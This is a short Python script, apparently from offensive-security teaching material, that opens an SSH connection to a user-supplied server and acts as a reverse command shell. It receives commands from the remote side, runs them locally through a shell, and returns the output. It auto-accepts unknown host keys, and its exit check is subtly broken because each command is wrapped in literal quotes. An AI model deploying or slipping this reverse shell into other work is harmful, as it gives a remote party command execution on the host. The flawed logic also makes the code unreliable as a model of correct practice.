import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    """
    Makes a connection to an SSH server and runs a single command.
    """
    client = paramiko.SSHClient()
    # auto accept the server's SSH keys, bad idea on networks we don't control
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # connect to the server
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            # get command from the connection
            command = ssh_session.recv(1024)
            try:
                cmd = f'"{command.decode()}"'
                if cmd == 'exit':
                    client.close()
                    break
                # execute the command
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                # send output back to caller
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == "__main__":
    import getpass
    # only works properly if the username is the same in both client and server
    # user = getpass.getuser()
    user = input('Username: ')
    password = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    # send command to be executed
    ssh_command(ip, port, user, password, 'ClientConnected')
